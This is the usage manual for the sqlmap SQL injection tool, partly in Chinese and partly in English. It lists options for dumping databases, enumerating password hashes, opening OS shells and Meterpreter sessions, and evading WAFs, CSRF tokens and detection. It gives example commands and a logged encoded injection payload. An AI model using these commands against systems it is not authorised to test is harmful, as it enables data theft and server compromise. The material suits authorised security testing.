# 用法

```
Usage: python sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -d DIRECT           Connection string for direct database connection
    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST
    --param-del=PARA..  Character used for splitting parameter values
    --cookie=COOKIE     HTTP Cookie header value
    --cookie-del=COO..  Character used for splitting cookie values
    --load-cookies=L..  File containing cookies in Netscape/wget format
    --drop-set-cookie   Ignore Set-Cookie header from response
    --user-agent=AGENT  HTTP User-Agent header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --host=HOST         HTTP Host header value
    --referer=REFERER   HTTP Referer header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    --ignore-401        Ignore HTTP Error 401 (Unauthorized)
    --proxy=PROXY       Use a proxy to connect to the target URL
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
    --proxy-file=PRO..  Load proxy list from a file
    --ignore-proxy      Ignore system default proxy settings
    --tor               Use Tor anonymity network
    --tor-port=TORPORT  Set Tor proxy port other than default
    --tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
    --check-tor         Check to see if Tor is used properly
    --delay=DELAY       Delay in seconds between each HTTP request
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retries=RETRIES   Retries when the connection timeouts (default 3)
    --randomize=RPARAM  Randomly change value for given parameter(s)
    --safe-url=SAFEURL  URL address to visit frequently during testing
    --safe-post=SAFE..  POST data to send to a safe URL
    --safe-req=SAFER..  Load safe HTTP request from a file
    --safe-freq=SAFE..  Test requests between two visits to a given safe URL
    --skip-urlencode    Skip URL encoding of payload data
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
    --force-ssl         Force usage of SSL/HTTPS
    --hpp               Use HTTP parameter pollution method
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

  Optimization:
    These options can be used to optimize the performance of sqlmap

    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --skip=SKIP         Skip testing for given parameter(s)
    --skip-static       Skip testing parameters that not appear to be dynamic
    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
    --dbms=DBMS         Force back-end DBMS to this value
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    --os=OS             Force back-end DBMS operating system to this value
    --invalid-bignum    Use big numbers for invalidating values
    --invalid-logical   Use logical operations for invalidating values
    --invalid-string    Use random strings for invalidating values
    --no-cast           Turn off payload casting mechanism
    --no-escape         Turn off string escaping mechanism
    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
    --tamper=TAMPER     Use given script(s) for tampering injection data

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --string=STRING     String to match when query is evaluated to True
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     Regexp to match when query is evaluated to True
    --code=CODE         HTTP code to match when query is evaluated to True
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    --union-char=UCHAR  Character to use for bruteforcing number of columns
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    --second-order=S..  Resulting page URL searched for second-order response

  Fingerprint:
    -f, --fingerprint   执行一个广泛的 DBMS 版本的 fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    --comments          Retrieve DBMS comments
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDECOL       DBMS database table column(s) to not enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --pivot-column=P..  Pivot column name
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --start=LIMITSTART  First query output entry to retrieve
    --stop=LIMITSTOP    Last query output entry to retrieve
    --first=FIRSTCHAR   First query output word character to retrieve
    --last=LASTCHAR     Last query output word character to retrieve
    --sql-query=QUERY   SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)

  Brute force:
    These options can be used to run brute force checks

    --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns

  User-defined function injection:
    These options can be used to create custom user-defined functions

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library

  File system access:
    These options can be used to access the back-end database management
    system underlying file system

    --file-read=RFILE   Read a file from the back-end DBMS file system
    --file-write=WFILE  Write a local file on the back-end DBMS file system
    --file-dest=DFILE   Back-end DBMS absolute filepath to write to

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

  Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry

    --reg-read          Read a Windows registry key value
    --reg-add           Write a Windows registry key value data
    --reg-del           Delete a Windows registry key value
    --reg-key=REGKEY    Windows registry key
    --reg-value=REGVAL  Windows registry key value
    --reg-data=REGDATA  Windows registry key value data
    --reg-type=REGTYPE  Windows registry key value type

  General:
    These options can be used to set some general working parameters

    -s SESSIONFILE      Load session from a stored (.sqlite) file
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
    --batch             Never ask for user input, use the default behaviour
    --binary-fields=..  Result fields having binary values (e.g. "digest")
    --charset=CHARSET   Force character encoding used for data retrieval
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
    --eta               Display for each output the estimated time of arrival
    --flush-session     Flush session files for current target
    --forms             Parse and test forms on target URL
    --fresh-queries     Ignore query results stored in session file
    --hex               Use DBMS hex function(s) for data retrieval
    --output-dir=OUT..  Custom output directory path
    --parse-errors      Parse and display DBMS error messages from responses
    --save=SAVECONFIG   Save options to a configuration INI file
    --scope=SCOPE       Regexp to filter targets from provided proxy log
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    --update            Update sqlmap

  Miscellaneous:
    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
    --alert=ALERT       Run host OS command(s) when SQL injection is found
    --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
    --beep              Beep on question and/or when SQL injection is found
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
    --dependencies      Check for missing (non-core) sqlmap dependencies
    --disable-coloring  Disable console output coloring
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection
    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
    --mobile            Imitate smartphone through HTTP User-Agent header
    --offline           Work in offline mode (only use session data)
    --purge-output      Safely remove all content from output directory
    --smart             Conduct thorough tests only if positive heuristic(s)
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users
```

## 输出信息的详细程度

Option: `-v`

这个操作用来设定输出信息的内容的详细级别。有**7**个详细等级。默认等级是**1**：显示基本信息、警告、错误、关键信息和（如果发生错误的话）python的错误信息追踪。

* **0**: 只显示python错误信息追踪、错误和关键信息。
* **1**: 同时显示基本信息和警告信息。
* **2**: 同时显示debug信息。
* **3**: 同时显示注入的payload。
* **4**: 同时显示HTTP请求。
* **5**: 同时显示HTTP响应头部。
* **6**: 同时显示HTTP响应内容。

要进一步了解sqlmap所做的，合理的级别是**2**，主要用于检测阶段和接管功能。而如果要查看sqlmap发送的SQL payload内容，级别**3**是最佳的选择。当您向开发人员提供潜在的bug报告时，建议使用这个级别，并确保在发送标准输出时，同时发送使用`-t`生成的流量日志文件。
为了以后调试潜在的bug和不可预测的操作（所引起的后果），建议将详细级别设置为**4**或更高。也可以使用更加简短的语句来设置详细级别（比如，`-v`表示`-v 2`，`-vv`表示`-v 3`，`-vvv`表示`-v 4`，……依此类推）

## 目标

至少选择以下一个作为目标。

### 直接连接数据库

Option: `-d`

对单个数据库实例运行sqlmap。这个操作接收以下任意一种形式的连接：

* `DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME` (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.)
* `DBMS://DATABASE_FILEPATH` (SQLite, Microsoft Access, Firebird, etc.)

例如：

```
$ python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --bann\
er --dbs --users
```

### 目标URL

Option: `-u`或者`--url`

对单个目标URL运行sqlmap。这个操作需要以下形式的URL：

`http(s)://targeturl[:port]/[...]`

例如：

```
$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs -\
-users
```

### 通过Burp或者WebScarab代理登录解析目标

Option: `-l`

不提供单个目标URL，可以通过[Burp代理](http://portswigger.net/suite/)或者
[WebScarab代理](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)测试和注入HTTP请求。这个操作需要代理的HTTP请求登录文件作为参数。

### 通过远程sitemap(.xml)文件解析目标

Option: `-x`

sitemap是一个文件，web管理员可以列出网站的网页位置，以告诉搜索引擎网站内容的组织形式。你可以使用`-x`来告诉sqlmap sitemap文件的位置（例如 `-x http://www.target.com/sitemap.xml`）

### 扫描给定文本文件中的大量目标

Option: `-m`

对给定批文件中的目标URL，sqlmap可以对其进行逐个扫描。

使用示例的批文件内容作为这个操作的参数：

    www.target1.com/vuln1.php?q=foobar
    www.target2.com/vuln2.asp?id=1
    www.target3.com/vuln3/id/1*

### 从文件中加载HTTP请求

Option: `-r`

sqlmap可以从文本文件中加载原始的HTTP请求。这样，您可以跳过其他一些操作（例如设置Cookie，POSTed数据等）。

使用示例的HTTP请求文件内容作为这个操作的参数：

    POST /vuln.php HTTP/1.1
    Host: www.target.com
    User-Agent: Mozilla/4.0
    
    id=1

请注意，如果请求是通过HTTPS，您可以结合使用`--force-ssl`来强制SSL连接到443/tcp。 或者，您可以将`：443`附加到`Host`头值的末尾。

### 将Google搜索到的URL作为目标处理

Option: `-g`

可以基于Google搜索的结果测试并注入GET参数。

这个操作使sqlmap与搜索引擎协商使其执行搜索的会话cookie，然后sqlmap会复现Google搜索的前100个结果，通过GET参数询问你是否想要测试并注入每个可能受影响的URL。

例如：

```
$ python sqlmap.py -g "inurl:\".php?id=1\""
```

### 从配置文件INI中加载操作

Option: `-c`

可以在配置文件INI中传递用户的操作，比如`sqlmap.conf`。

注意，如果你从命令行提供操作，当运行sqlmap时，这些操作将被评估并覆盖配置文件中的操作。

## 请求

这些操作用来详细解释如何与目标URL连接。

### HTTP方法

Option: `--method`

sqlmap自动检测HTTP请求中的正确的HTTP方法。然而，在一些情况下，需要使用特定的自动指定之外的HTTP方法（例如：`PUT`）。可以使用这个option来实现（例如：`--method=PUT`）。

### HTTP数据

Option: `--data`

默认情况下，用于执行HTTP请求的方法是GET，但你可以在发送的POST请求中更改数据。这些数据作为参数，将与提供的GET参数同时进行针对SQL注入的测试。

例如：

```
$ python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banne\
r --dbs --users
```

### 参数分割字符

Option: `--param-del`

有些情况下，需要重写sqlmap的默认参数分隔符（例如：GET和POST数据中的`&`），以便能够分别正确拆分和处理每个参数。

例如：

```
$ python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=\
1" --param-del=";" -f --banner --dbs --users
```

### HTTP `Cookie`头

Options and switch: `--cookie`，`--cookie-del`，`--load-cookies`和`--drop-set-cookie`

These options and switches can be used in two situations:

* The web application requires authentication based upon cookies and you have such data.
* You want to detect and exploit SQL injection on such header values.

Either reason brings you to need to send cookies with sqlmap requests, the steps to go through are the following:

* Login to the application with your favourite browser.
* Get the HTTP Cookie from the browser's preferences or from the HTTP proxy screen and copy to the clipboard.
* Go back to your shell and run sqlmap by pasting your clipboard as value of the option `--cookie`.

Note that the HTTP `Cookie` header values are usually separated by a `;` character, **not** by an `&`. sqlmap can recognize these as separate sets of `parameter=value` too, as well as GET and POST parameters. In case that the separation character is other than `;` it can be specified by using option `--cookie-del`.

If at any time during the communication, the web application responds with `Set-Cookie` headers, sqlmap will automatically use its value in all further HTTP requests as the `Cookie` header. sqlmap will also automatically test those values for SQL injection. This can be avoided by providing the switch `--drop-set-cookie` - sqlmap will ignore any coming `Set-Cookie` header.

Vice versa, if you provide a HTTP `Cookie` header with option `--cookie` and the target URL sends an HTTP
`Set-Cookie` header at any time, sqlmap will ask you which set of cookies to use for the following HTTP requests.

There is also an option `--load-cookies` which can be used to provide a special file containing Netscape/wget formatted cookies.

Note that also the HTTP `Cookie` header is tested against SQL injection if the `--level` is set to **2** or above. Read below for details.

### HTTP `User-Agent`头

Option and switch: `--user-agent` and `--random-agent`

By default sqlmap performs HTTP requests with the following `User-Agent` header value:

    sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)

However, it is possible to fake it with the option `--user-agent` by providing custom User-Agent as the option's argument.

Moreover, by providing the switch `--random-agent`, sqlmap will randomly select a `User-Agent` from the `./txt/user-agents.txt` textual file and use it for all HTTP requests within the session.

Some sites perform a server-side check of HTTP `User-Agent` header value and fail the HTTP response if a valid `User-Agent` is not provided, its value is not expected or is blacklisted by a web application firewall or similar intrusion prevention system. In this case sqlmap will show you a message as follows:

    [hh:mm:20] [ERROR] the target URL responded with an unknown HTTP status code, try to 
    force the HTTP User-Agent header with option --user-agent or --random-agent

Note that also the HTTP `User-Agent` header is tested against SQL injection if the `--level` is set to **3** or above.
Read below for details.

### HTTP `Host`头

Option: `--host`

你可以自己设置HTTP `Host`头的值。默认情况下，HTTP `Host`头是由目标URL解析而来的。

Note that also the HTTP `Host` header is tested against SQL injection if the `--level` is set to **5**. Read below for details.

### HTTP `Referer`头

Option: `--referer`

It is possible to fake the HTTP `Referer` header value. By default **no** HTTP `Referer` header is sent in HTTP requests if not explicitly set.

Note that also the HTTP `Referer` header is tested against SQL injection if the `--level` is set to **3** or above. Read below for details.

### 其余HTTP头

Option: `--headers`

It is possible to provide extra HTTP headers by setting the option `--headers`. Each header must be separated by a newline and it is much easier to provide them from the configuration INI file. You can take a look at the sample `sqlmap.conf` file for such case.

示例（对一个MySQL目标的运行结果）：

```
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z \
"ign,flu,bat,tec=E" --headers="Host:www.target.com\nUser-agent:Firefox 1.0" -v 5
[...]
[xx:xx:44] [TRAFFIC OUT] HTTP request [#5]:
GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20FROM%28SELECT%20C\
OUNT%28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C\
0x3a6c666d3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARA\
CTER_SETS%20GROUP%20BY%20x%29a%
29 HTTP/1.1
Host: www.target.com
Accept-encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-agent: Firefox 1.0
Connection: close
[...]
```

### HTTP协议认证

Options: `--auth-type`和`--auth-cred`

These options can be used to specify which HTTP protocol authentication back-end web server implements and the valid credentials to be used to perform all HTTP requests to the target application.

The three supported HTTP protocol authentication mechanisms are:

* `Basic`
* `Digest`
* `NTLM`

While the credentials' syntax is `username:password`.

Example of valid syntax:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\
=1" --auth-type Basic --auth-cred "testuser:testpass"
```

### HTTP protocol private key authentication

Option: `--auth-file`

This option should be used in cases when the web server requires proper client-side certificate and a private key for authentication. Supplied value should be a PEM formatted `key_file` that contains your certificate and a private key.


### Ignore HTTP error 401 (Unauthorized)

Switch `--ignore-401`

In case that you want to test the site that occasionally returns HTTP error 401 (Unauthorized), while you want to ignore it and continue tests without providing proper credentials, you can use switch `--ignore-401`

### HTTP(S)代理

Options and switch: `--proxy`, `--proxy-cred`, `--proxy-file` and `--ignore-proxy`

It is possible to provide an HTTP(S) proxy address to pass by the HTTP(S) requests to the target URL with option `--proxy`. The syntax of HTTP(S) proxy value is `http://url:port`.

If the HTTP(S) proxy requires authentication, you can provide the credentials in the format `username:password` to the
option `--proxy-cred`.

In case that you want to use (disposable) proxy list, skipping to the next proxy on any sign of a connection problem (e.g. blocking of invasive IP address), option `--proxy-file` can be used by providing filename of a file containing bulk list of proxies.

Switch `--ignore-proxy` should be used when you want to run sqlmap against a target part of a local area network by ignoring the system-wide set HTTP(S) proxy server setting.

### Tor anonymity network

Switches and options: `--tor`, `--tor-port`, `--tor-type` and `--check-tor`

If, for any reason, you need to stay anonymous, instead of passing by a single predefined HTTP(S) proxy server, you can configure a [Tor client](http://www.torproject.org/) together with [Privoxy](http://www.privoxy.org) (or similar) on your machine as explained in [Tor installation guides](https://www.torproject.org/docs/installguide.html.en). Then you can use a switch `--tor` and sqlmap will try to automatically set Tor proxy connection settings.

In case that you want to manually set the type and port of used Tor proxy, you can do it with options `--tor-type` and `--tor-port` (e.g. `--tor-type=SOCKS5 --tor-port 9050`).

You are strongly advised to use `--check-tor` occasionally to be sure that everything was set up properly. There are cases when Tor bundles (e.g. Vidalia) come misconfigured (or reset previously set configuration) giving you a false sense of anonymity. Using this switch sqlmap will check that everything works as expected by sending a single request to an official [Are you using Tor?](https://check.torproject.org/) page before any target requests. In case that check fails, sqlmap will warn you and abruptly exit.

### 每个HTTP请求的时间间隔

Option: `--delay`

可以指定每个HTTP(S)请求的时间间隔秒数。有效值为浮点数，例如`0.5`表示半秒。默认情况下不设置延迟。

### 超时等待秒数

Option: `--timeout`

可以指定HTTP(S)的超时等待秒数。有效值是浮点数，例如10.5表示10秒半。默认情况下设置为**30秒**。

### HTTP连接超时时的最大重试次数

Option: `--retries`

当HTTP(S)连接超时时，可以指定最大重试次数。 默认情况下，这个值最多为**3次**。

### 随机更改给定参数的值

Option: `--randomize`

你可以指定每个请求中需要被随机修改值的参数的名称。长度和类型仍为所提供的原始值。

### 使用正则表达式过滤提供的代理日志中的目标

Option: `--scope`

你可以指定用于过滤的Python正则表达式，而不用在日志中一律通过option`-l`解析的主机。

正确的语法示例：

```
$ python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
```

### 避免你的会话在过多不成功的请求后被销毁

Options: `--safe-url`, `--safe-post`, `--safe-req` and `--safe-freq`

有时，web应用程序或者检查测试技术会在一定量的不成功请求被执行后，销毁会话。这可能发生在sqlmap的检测阶段或者使用任何类型的SQL盲注过程中。原因是此时SQL payload不返回输出，并向应用程序会话管理系统或者检查测试发送信号。

为了绕过目标设定的这些限制，你可以使用以下任意（或者几种结合）的命令：

* `--safe-url`: 在测试中定时访问安全、正确的URL。
* `--safe-post`: 设置正确的HTTP POST data发送给给定的安全的URL。
* `--safe-req`: 从文件中加载并使用安全的HTTP请求。
* `--safe-freq`: 在两次访问给定安全URL之间测试请求。

这样，sqlmap就可以在不对URL执行注入的情况下访问预先设定的数量的_安全_的URL。

### 不对参数值进行URL编码

Switch: `--skip-urlencode`

根据参数的位置（例如，GET），参数会默认进行URL编码。在某些情况下，后端的web服务器不遵循RFC标准，需要参数以未编码的形式发送。在这些情况下，使用`--skip-urlencode`。

# Bypass anti-CSRF protection

Options: `--csrf-token` and `--csrf-url`

Lots of sites incorporate anti-CSRF protection in form of tokens, hidden field values that are randomly set during each page response. sqlmap will automatically try to recognize and bypass that kind of protection, but there are options `--csrf-token` and `--csrf-url` that can be used to further fine tune it. Option `--csrf-token` can be used to set the name of the hidden value that contains the randomized token. This is useful in cases when web sites use non-standard names for such fields. Option `--csrf-url` can be used for retrieval of the token value from arbitrary URL address. This is useful if the vulnerable target URL doesn't contain the necessary token value in the first place, but it is required to extract it from some other location.

### Force usage of SSL/HTTPS

Switch: `--force-ssl`

In case that user wants to force usage of SSL/HTTPS requests toward the target, he can use this switch. This can be useful in cases when urls are being collected by using option `--crawl` or when Burp log is being provided with option `-l`.

### Evaluate custom python code during each request

Option: `--eval`

In case that user wants to change (or add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with option `--eval` that will be evaluated just before each request.

For example:

```
$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b9238\
20dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
```

Each request of such run will re-evaluate value of GET parameter `hash` to contain a fresh MD5 hash digest for current value of parameter `id`.

## Optimization

These switches can be used to optimize the performance of sqlmap.

### Bundle optimization

Switch: `-o`

This switch is an alias that implicitly sets the following options and switches:

* `--keep-alive`
* `--null-connection`
* `--threads=3` if not set to a higher value.


Read below for details about each switch.

### Output prediction

Switch: `--predict-output`

This switch is used in inference algorithm for sequential statistical prediction of characters of value being retrieved. Statistical table with the most promising character values is being built based on items given in `txt/common-outputs.txt` combined with the knowledge of current enumeration used. In case that the value can be found among the common output values, as the process progresses, subsequent character tables are being narrowed more and more. If used in combination with retrieval of common DBMS entities, as with system table names and privileges, speed up is significant. Of course, you can edit the common outputs file according to your needs if, for instance, you notice common patterns in database table names or similar.

Note that this switch is not compatible with `--threads` switch.

### HTTP Keep-Alive

Switch: `--keep-alive`

This switch instructs sqlmap to use persistent HTTP(s) connections.

Note that this switch is incompatible with `--proxy` switch.

### HTTP NULL connection

Switch: `--null-connection`

There are special HTTP request types which can be used to retrieve HTTP response's size without getting the HTTP body. This knowledge can be used in blind injection technique to distinguish `True` from `False` responses. When this switch is provided, sqlmap will try to test and exploit two different _NULL connection_ techniques: `Range` and `HEAD`. If any of these is supported by the target web server, speed up will come from the obvious saving of used bandwidth.

These techniques are detailed in the white paper [Bursting Performances in Blind SQL Injection - Take 2 (Bandwidth)](http://www.wisec.it/sectou.php?id=472f952d79293).

Note that this switch is incompatible with switch `--text-only`.

### Concurrent HTTP(S) requests

Option: `--threads`

It is possible to specify the maximum number of concurrent HTTP(S) requests that sqlmap is allowed to do.
This feature relies on [multi-threading](http://en.wikipedia.org/wiki/Multithreading) concept and inherits both its pro and its cons.

This features applies to the brute-force switches and when the data fetching is done through any of the blind SQL injection techniques. For the latter case, sqlmap first calculates the length of the query output in a single thread, then starts the multi-threading. Each thread is assigned to retrieve one character of the query output. The thread ends when that character is retrieved - it takes up to 7 HTTP(S) requests with the bisection algorithm implemented in sqlmap.

The maximum number of concurrent requests is set to **10** for performance and site reliability reasons.

Note that this option is not compatible with switch `--predict-output`.

## Injection

These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts.

### Testable parameter(s)

Options: `-p`, `--skip` and `--param-exclude`

By default sqlmap tests all GET parameters and POST parameters. When the value of `--level` is >= **2** it tests also HTTP `Cookie` header values. When this value is >= **3** it tests also HTTP `User-Agent` and HTTP `Referer` header value for SQL injections. It is however possible to manually specify a comma-separated list of parameter(s) that you want sqlmap to test. This will bypass the dependence on value of `--level` too. 

For instance, to test for GET parameter `id` and for HTTP `User-Agent` only, provide `-p "id,user-agent"`.

In case that user wants to exclude certain parameters from testing, he can use option `--skip`. That is especially useful in cases when you want to use higher value for `--level` and test all available parameters excluding some of HTTP headers normally being tested.

For instance, to skip testing for HTTP header `User-Agent` and HTTP header `Referer` at `--level=5`, provide `--skip="user-agent,referer"`.

There is also a possibility to exclude certain parameters from testing based on a regular expression run on their names. In those kind of cases user can use option `--param-exclude`.

For instance, to skip testing for parameters which contain string `token` or `session` in their names, provide `--param-exclude="token|session"`.

#### URI injection point

There are special cases when injection point is within the URI itself. sqlmap does not perform any automatic test against URI paths, unless manually pointed to. You have to specify these injection points in the command line by appending an asterisk (`*`) (Note: Havij style `%INJECT HERE%` is also supported) after each URI point that you want sqlmap to test for and exploit a SQL injection. 

This is particularly useful when, for instance, Apache web server's [mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html) module is in use or other similar technologies.

An example of valid command line would be:

```
$ python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
```

#### Arbitrary injection point

Similar to URI injection point, asterisk (`*`) (Note: Havij style `%INJECT HERE%` is also supported) can also be used to point to the arbitrary injection point inside GET, POST or HTTP headers. Injection point can be specified by marking it inside the GET parameter value(s) provided with option `-u`, POST parameter value(s) provided with option `--data`, HTTP header value(s) provided with options `-H`, `--headers`, `--user-agent`, `--referer` and/or `--cookie`, or at generic place inside HTTP request loaded from file with option `-r`.

An example of valid command line would be:

```
$ python sqlmap.py -u "http://targeturl" --cookie="param1=value1*;param2=value2"
```

### Force the DBMS

Option: `--dbms`

By default sqlmap automatically detects the web application's back-end database management system. sqlmap fully supports the following database management systems: 

* MySQL
* Oracle
* PostgreSQL
* Microsoft SQL Server
* Microsoft Access
* IBM DB2
* SQLite
* Firebird
* Sybase
* SAP MaxDB
